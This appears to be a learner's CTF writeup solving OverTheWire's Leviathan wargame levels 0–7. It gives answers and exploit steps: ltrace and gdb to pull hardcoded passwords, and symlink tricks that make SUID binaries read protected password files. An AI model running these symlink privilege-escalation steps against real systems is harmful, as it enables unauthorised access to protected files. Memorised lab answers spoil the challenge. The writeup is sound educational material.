# OverTheWire: Leviathan — Full Writeup (Levels 0–7)

The key tools introduced here are `ltrace` (library call tracer) and `gdb` (GNU debugger), which let you peek inside compiled programs without having their source code.

---

## Connecting

```bash
ssh leviathan<LEVEL>@leviathan.labs.overthewire.org -p 2223
```

---

## Level 0 → 1: Hidden File & Grep

**Goal:** Find the password hidden somewhere in the home directory.

```bash
ls -la
cd .backup/
cat bookmarks.html | grep pass
```

The home directory contains a hidden `.backup/` folder (visible only with `ls -la`). Inside is a large HTML bookmarks file. Rather than reading it manually, piping it through `grep pass` finds the one line containing the password instantly.

**Key concept:** Hidden directories (prefixed with `.`) and using `grep` to search large files efficiently.

---

## Level 1 → 2: `ltrace` — Spying on a Binary

**Goal:** A SUID binary `check` asks for a password. Find out what password it expects.

```bash
file check          # confirm it's a SUID ELF binary
ltrace ./check      # trace library calls while running it
```

**`ltrace` output (abbreviated):**
```
strcmp("yyy", "sex")   = 1
puts("Wrong password, Good Bye ...")
```

`ltrace` intercepts calls to shared library functions. Here it reveals that the binary compares our input against the hardcoded string `"sex"` using `strcmp`. Supplying the correct password drops us into a shell running as `leviathan2`.

```bash
./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
```

---

## Level 2 → 3: Symlink Attack on a SUID Binary

**Goal:** A SUID binary `printfile` prints any file you give it — unless it's the password file.

```bash
./printfile /etc/leviathan_pass/leviathan3
# "You cant have that file..."
mkdir /tmp/levitest
echo test123 > /tmp/levitest/'my test.txt'
./printfile /tmp/levitest/my\ test.txt
/bin/cat: /tmp/levitest/my: No such file or directory
/bin/cat: test.txt: No such file or directory
ln -s /etc/leviathan_pass/leviathan3 /tmp/levitest/my   # cat reads THIS via the symlink
./printfile "/tmp/levitest/my test.txt"
```

The binary has a logic flaw: it checks access permissions on the **full filename** (treating `my test.txt` as one file), but then passes the string to `system("/bin/cat ...")` which the shell **splits on the space** — treating `my` and `test.txt` as two separate filenames.

Exploit this by:
1. Creating a file with a space in its name: `my test.txt`
2. Creating a symlink named `my` pointing to the password file

**Key concept:** This is a **symlink attack** combined with a **TOCTOU (Time-of-Check to Time-of-Use)** vulnerability. The check and the action operate on different things.

---

## Level 3 → 4: `ltrace` Again — Hardcoded Password

**Goal:** Another SUID binary, `level3`, asks for a password.

```
ltrace ./level3
strcmp("sesese\n", "snlprintf\n")   = -1
puts("bzzzzzzzzap. WRONG")
```

Same technique as Level 1 — `ltrace` exposes the hardcoded expected string directly from a `strcmp` call.

```bash
./level3
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
```

**Key concept:** When binaries hardcode secrets in plaintext and compare with `strcmp`. `ltrace` makes this trivially exploitable. In production software, this is why secrets should never be hardcoded.

---

## Level 4 → 5: Binary to ASCII Decoding

**Goal:** A SUID binary in a hidden `.trash/` directory outputs a string of binary (0s and 1s).

```bash
ls -la          # reveals hidden .trash/ directory
cd .trash/
./bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
```

The output is ASCII characters encoded as 8-bit binary. I decode it with Python:

```python
bin_pass = '00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010'
chunks = bin_pass.split(' ')
password = [chr(int(ch, 2)) for ch in chunks]
print("".join(password))
```

**Key concept:** Decode binary with Python.

---

## Level 5 → 6: Symlink to Redirect a Binary's File Read

**Goal:** A binary `leviathan5` reads from `/tmp/file.log` — redirect it to read the password file instead.

```bash
./leviathan5
"Cannot find /tmp/file.log"

echo test > /tmp/file.log
./leviathan5
test  # confirms it reads and prints /tmp/file.log

# Now replace the file with a symlink pointing to the password
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
# prints leviathan6's password
```

The binary trusts the path `/tmp/file.log` unconditionally. Since `/tmp` is writable,  place a symlink there that redirects to read password.

**Key concept:** Symlink attack in `/tmp` is a privilege escalation vector. Never trust paths in `/tmp` in privileged binaries.

---

## Level 6 → 7: GDB — Reverse Engineering a PIN

**Goal:** A SUID binary `leviathan6` takes a 4-digit code.

```bash
ltrace ./leviathan6 7777
atoi(0xffffd5d3, 0,0,0)                                          puts("Wrong")
```

ltrace doesn't reveal the comparison value directly
so step up to `gdb` to disassemble the binary:

```bash
gdb --args ./leviathan6 9999
(gdb) disassemble main
```

**Key disassembly output:**
```asm
movl   $0x1bd3, -0xc(%ebp)    ← stores the hardcoded value 0x1bd3
...
cmp    %eax, -0xc(%ebp)       ← compares our input against it
jne    0x804924a <main+132>   ← jump to worng branch
```

The binary stores `0x1bd3` as the expected value. Converting from hex to decimal is 7123

```bash
./leviathan6 7123
$ cat /etc/leviathan_pass/leviathan7
```

**Key concept:** When `ltrace` isn't enough, `gdb` let read the raw assembly. Recognizing a `mov` of a constant followed by a `cmp` and understand Assembly. 

---

### Level 7: The End
> **Congratulations — Leviathan complete!**

---

## Key Concepts Covered

| Topic | Levels |
|---|---|
| Hidden files & `grep` | 0 |
| `ltrace` — library call tracing | 1, 3 |
| Symlink attacks (TOCTOU) | 2, 5 |
| Binary/ASCII encoding & Python decoding | 4 |
| `gdb` — disassembly & hex arithmetic | 6 |

---


*Part of my CTF learning journey. Writeups for each wargame are in separate folders in this repo.*
